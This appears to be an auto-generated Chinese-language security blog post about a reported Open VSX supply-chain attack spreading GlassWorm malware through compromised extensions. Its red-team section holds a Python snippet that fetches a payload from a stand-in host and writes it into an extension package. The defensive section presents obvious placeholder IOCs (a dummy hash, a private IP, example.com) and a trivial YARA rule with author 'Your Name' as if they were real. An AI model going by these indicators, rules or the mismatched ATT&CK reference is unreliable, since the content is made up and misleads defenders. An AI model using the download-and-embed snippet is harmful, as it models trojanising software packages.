---
layout: post
title:  "Open VSX Supply Chain Attack Used Compromised Dev Account to Spread GlassWorm"
date:   2026-02-02 06:55:59 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Open VSX 供應鏈攻擊：GlassWorm 惡意軟體的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Supply Chain Attack`, `Malicious Extension`, `GlassWorm Malware`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用開發者的憑證進行 supply chain 攻擊，將惡意軟體嵌入到 Open VSX 的擴充套件中。
* **攻擊流程圖解**:
  1. 攻擊者取得開發者的憑證。
  2. 攻擊者將惡意軟體嵌入到 Open VSX 的擴充套件中。
  3. 使用者安裝受感染的擴充套件。
  4. 惡意軟體被執行，導致 RCE。
* **受影響元件**: Open VSX Registry、oorzc.ssh-tools、oorzc.i18n-tools-plus、oorzc.mind-map、oorzc.scss-to-css-compile。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得開發者的憑證。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意軟體的 URL
    malware_url = "https://example.com/malware"
    
    # 定義受感染的擴充套件
    extension_name = "oorzc.ssh-tools"
    
    # 下載惡意軟體
    response = requests.get(malware_url)
    
    # 將惡意軟體嵌入到擴充套件中
    with open(f"{extension_name}.vsix", "wb") as f:
        f.write(response.content)
    
    ```
* **繞過技術**: 攻擊者可以使用 `EtherHiding` 技術來隱藏惡意軟體的 C2 端點。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/lib/oorzc.ssh-tools |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule GlassWorm_Malware {
      meta:
        description = "GlassWorm 惡意軟體"
        author = "Your Name"
      strings:
        $a = "GlassWorm" ascii
      condition:
        $a
    }
    
    ```
* **緩解措施**: 使用者應該更新 Open VSX Registry 和擴充套件至最新版本，並啟用安全功能，如憑證驗證和加密。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意軟體嵌入到軟體供應鏈中，例如開發者的憑證或第三方庫。
* **Malicious Extension (惡意擴充套件)**: 惡意軟體嵌入到擴充套件中，例如 Open VSX 的擴充套件。
* **GlassWorm Malware (GlassWorm 惡意軟體)**: 一種惡意軟體，可以嵌入到 Open VSX 的擴充套件中，導致 RCE。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/open-vsx-supply-chain-attack-used.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


